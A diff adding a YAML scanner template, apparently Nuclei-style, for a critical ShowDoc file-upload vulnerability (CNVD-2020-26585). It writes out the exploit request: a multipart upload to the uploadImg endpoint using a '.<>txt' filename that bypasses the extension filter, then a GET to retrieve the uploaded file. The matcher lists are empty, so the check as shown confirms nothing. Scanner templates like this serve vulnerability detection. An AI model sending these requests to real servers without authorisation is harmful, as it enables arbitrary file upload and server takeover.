@@ -1,0 +1,32 @@
+id: CNVD-2020-26585
+brief:
+    title: Showdoc <2.8.6 - File Uploads
+    by: pikpikcu
+    level: critical
+    about: ShowDoc is an online API and technical documentation tool that is very suitable for IT teams. Showdoc has a file upload vulnerability, which attackers can exploit to gain server permissions.
+    label:
+        - cnvd
+        - cnvd2020
+        - showdoc
+        - fileupload
+        - intrusive
+        - vuln
+    score: CVSS:9.9
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/index.php?s=/home/page/uploadImg'
+      head:
+        Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+      body: |-
+        ----------------------------835846770881083140190633
+        Content-Disposition: form-data; name="editormd-image-file"; filename="{{randstr}}.<>txt"
+        Content-Type: text/plain
+
+        {{str1}}
+        ----------------------------835846770881083140190633--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/Public//Uploads//{{date}}//{{file}}'
+      signs: []
